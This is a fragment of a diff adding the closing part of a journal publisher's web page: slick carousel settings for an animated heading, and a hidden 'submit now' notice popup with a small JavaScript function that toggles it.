+					infinite: true,
+					pauseOnHover: false,
+					swipe: false,
+					touchMove: true,
+					vertical: true,
+					speed: 1500,
+					autoplaySpeed: 1000,
+					useTransform: true,
+					cssEase: 'cubic-bezier(0.645, 0.045, 0.355, 1.000)',
+					adaptiveHeight: true,
+				});
+
+				// On init
+				$(".slick-dupe").each(function(index, el) {
+					$("#animatedHeading").slick('slickAdd', "<div>" + el.innerHTML + "</div>");
+				});
+
+				// Manually refresh positioning of slick
+				titleMain.slick('slickPlay');
+			};
+		</script>
+		<div class="imNotice" id="imNotice" style="display: none;">
+			<div class="noImg">
+				<img src="/images/new-journals.jpg">
+			</div>
+			<div class="noButton">
+				<div class="noClose" onclick="quitNo()">Close</div>
+				<div class="noSubmit"><a href="https://journals.e-palli.com/journals/new" target="_blank">Submit Now</a></div>
+			</div>
+		</div>
+
+		<script>
+			function quitNo() {
+				var x = document.getElementById("imNotice");
+				var y = document.getElementById("site");
+				if (window.getComputedStyle(x).display === "none") {
+					x.style.display = 'block';
+				} else {
+					x.style.display = 'none';
+					y.style.opacity = '1';
+				}
+			}
+		</script>
+	</body>
+</html>
